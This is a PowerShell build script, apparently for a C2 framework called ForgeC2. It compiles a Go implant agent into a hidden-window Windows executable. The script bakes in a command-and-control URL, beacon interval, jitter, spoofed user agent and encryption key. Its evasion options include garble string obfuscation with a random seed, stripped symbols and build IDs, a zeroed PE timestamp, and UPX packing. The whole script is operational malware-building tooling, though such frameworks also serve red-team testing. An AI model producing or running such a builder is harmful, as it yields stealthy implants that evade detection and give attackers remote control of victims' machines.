param(
    [Parameter(Mandatory=$true)]
    [string]$C2URL,

    [string]$Protocol = "http",
    [int]$Interval = 10,
    [int]$Jitter = 20,
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    [string]$CryptoKey = "",
    [string]$Output = "forgec2_agent_obfuscated.exe",
    [switch]$UPX,
    [string]$UPXPath = "upx.exe",
    [switch]$Garble
)

$ErrorActionPreference = "Stop"
$ProjectRoot = Split-Path -Parent $PSScriptRoot

# Locate go.exe
$goExe = Get-Command "go" -ErrorAction SilentlyContinue
if (-not $goExe) {
    $candidates = @(
        "$env:USERPROFILE\go\bin\go.exe",
        "C:\Program Files\Go\bin\go.exe",
        "C:\Program Files (x86)\Go\bin\go.exe"
    )
    $sdkDir = "$env:USERPROFILE\sdk"
    if (Test-Path $sdkDir) {
        Get-ChildItem $sdkDir -Directory | Where-Object { $_.Name -like "go*" } | ForEach-Object {
            $candidates += "$($_.FullName)\bin\go.exe"
        }
    }
    $goExe = $candidates | Where-Object { Test-Path $_ } | Select-Object -First 1
}
if (-not $goExe) {
    Write-Error "Go executable not found. Set GO_BINARY or install Go."
    exit 1
}

Write-Host "[*] Using Go: $goExe"

# Locate garble if requested
if ($Garble) {
    $garbleExe = Get-Command "garble" -ErrorAction SilentlyContinue
    if (-not $garbleExe) {
        Write-Host "[!] garble not found. Install with: go install mvdan.cc/garble@latest"
        exit 1
    }
    Write-Host "[*] Using garble: $($garbleExe.Source)"
}

# Create temp directory for the build
$tmpDir = Join-Path $env:TEMP "forgec2_build_$(Get-Random)"
New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null

try {
    # Copy agent source to temp dir
    $agentSrc = Join-Path $ProjectRoot "internal\payload\agent"
    Copy-Item -Path "$agentSrc\*" -Destination $tmpDir -Recurse -Force

    # Run go mod init in temp dir
    Push-Location $tmpDir
    & $goExe mod init github.com/forgec2/forgec2/agent
    & $goExe mod tidy
    Pop-Location

    # Build ldflags
    $ldflags = "-s -w -buildid= -H=windowsgui"
    $ldflags += " -X main.C2URL=$([System.Security.SecurityElement]::Escape($C2URL))"
    $ldflags += " -X main.IntervalStr=$Interval"
    $ldflags += " -X main.JitterStr=$Jitter"
    $ldflags += " -X main.UserAgent=$([System.Security.SecurityElement]::Escape($UserAgent))"
    $ldflags += " -X main.Protocol=$Protocol"
    if ($CryptoKey) {
        $ldflags += " -X main.CryptoKeyStr=$CryptoKey"
    }

    Write-Host "[*] Building agent..."
    Write-Host "[*] ldflags: $ldflags"

    if ($Garble) {
        # Use garble for build-time obfuscation (aggressive mode)
        # -literals: encrypt/obfuscate literals (strings, numbers)
        # -tiny: strip more data, smaller binary
        # -seed=random: random obfuscation seed each build
        $garbleArgs = @(
            "-literals", "-tiny", "-seed=random"
            "build"
            "-ldflags", $ldflags
            "-o", $Output
            "-trimpath"
            "."
        )
        Push-Location $tmpDir
        & $garbleExe $garbleArgs
        Pop-Location
    } else {
        # Standard Go build with max strip
        Push-Location $tmpDir
        & $goExe build `
            -ldflags $ldflags `
            -o $Output `
            -trimpath `
            -buildvcs=false
            .
        Pop-Location
    }

    $builtPath = Join-Path $tmpDir $Output
    if (-not (Test-Path $builtPath)) {
        Write-Error "Build failed - output not found"
        exit 1
    }

    # Copy to output
    $outPath = Join-Path (Get-Location) $Output
    Copy-Item -Path $builtPath -Destination $outPath -Force

    Write-Host "[*] Built: $outPath"
    Write-Host "[*] Size: $((Get-Item $outPath).Length / 1KB) KB"

    # Anonymize PE header (Windows-only): zero out timestamp
    if ($Output -match "\.exe$" -and $IsWindows) {
        try {
            $bytes = [System.IO.File]::ReadAllBytes($outPath)
            # PE header timestamp at offset 0x88 (64-bit) or 0x84 from PE sig
            $peOffset = [BitConverter]::ToInt32($bytes, 0x3C)
            $tsOffset = $peOffset + 8
            if ($tsOffset + 4 -le $bytes.Length) {
                [Array]::Clear($bytes, $tsOffset, 4)
                [System.IO.File]::WriteAllBytes($outPath, $bytes)
                Write-Host "[*] PE header timestamp zeroed"
            }
        } catch { Write-Host "[!] PE timestamp clear failed (non-critical)" }
    }

    # UPX compression
    if ($UPX) {
        Write-Host "[*] Compressing with UPX..."
        & $UPXPath --best --no-color -f $outPath 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Host "[*] UPX compressed: $outPath"
            Write-Host "[*] Size after UPX: $((Get-Item $outPath).Length / 1KB) KB"
        } else {
            Write-Host "[!] UPX compression failed (exit code: $LASTEXITCODE)"
        }
    }

    Write-Host "[*] Done!"

} finally {
    if (Test-Path $tmpDir) {
        Remove-Item -Path $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
    }
}
